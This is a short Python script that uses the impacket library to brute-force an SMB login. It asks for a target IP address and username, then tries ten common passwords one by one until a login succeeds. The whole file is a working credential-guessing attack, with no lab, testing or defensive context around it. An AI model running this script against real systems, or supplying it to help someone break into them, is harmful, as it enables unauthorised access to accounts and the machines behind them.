from impacket.smbconnection import SMBConnection
import time

target_ip = input("Enter target IP address: ")
username = input("Enter username to brute force: ")

passwords = [
    "password123",
    "123456",
    "admin",
    "letmein",
    "qwerty",
    "welcome",
    "password1",
    "abc123",
    "12345678",
    "admin123"
]

for i, password in enumerate(passwords, 1):
    try:
        print(f"[{i}] Trying password: {password}")
        conn = SMBConnection(target_ip, target_ip)
        conn.login(username, password)
        print(f"\n[✔] SUCCESS: Password is '{password}'")
        break
    except Exception as e:
        print(f"[✘] Failed login with: {password} - {e}")
        time.sleep(1)
else:
    print("\n[!] All 10 password attempts failed.")
